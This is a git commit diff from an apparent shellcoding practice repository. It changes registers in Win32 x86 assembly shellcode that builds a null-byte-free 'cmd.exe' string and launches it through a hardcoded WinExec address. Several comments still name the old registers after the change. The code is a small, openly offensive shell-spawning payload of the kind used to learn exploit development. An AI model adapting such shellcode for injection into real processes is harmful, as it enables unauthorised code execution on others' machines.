936256a75238ac3a5edb5770becb9096114db8e7
lem0nSec <98479572+lem0nSec@users.noreply.github.com>
2022-05-18 23:23:22 +0200

    Update --> win32_cmd_shellcode.asm

--- shellcoding/--> win32_cmd_shellcode.asm
+++ shellcoding/--> win32_cmd_shellcode.asm
@@ -22,16 +22,16 @@ global _start
 	xor ebx, ebx
 	push ebx			; zeroing out ebx and pushing it
 	push 0x6578652e			; pushing exe.
-	xor edx, edx
-	mov edx, 0x01656e64
-	sub edx, 0x01010101
-	push edx			; pushing cmd --> null-byte-free 'dmc' obtained with some arithmetic ops in edx
-	mov ecx, esp			; storing addr of cmd.exe into edx and pushing it
-	push ecx
+	xor ecx, ecx
+	mov ecx, 0x01656e64
+	sub ecx, 0x01010101
+	push ecx			; pushing cmd --> null-byte-free 'dmc' obtained with some arithmetic ops in edx
+	mov edx, esp			; storing addr of cmd.exe into edx and pushing it
+	push edx
 	push 1				; pushing command line arg 2
-	push ecx
-	mov ebx, 0x7C8623AD
-	call ebx			; storing Winexec func (kernel32.dll) into ebx, then calling it
+	push edx
+	mov eax, 0x7C8623AD
+	call eax			; storing Winexec func (kernel32.dll) into ebx, then calling it
 	xor ebx, ebx
 	push ebx			; pushing 0 onto the stack as ExitProcess (kernel32.dll) arg
 	mov eax, 0x7C81CAFA
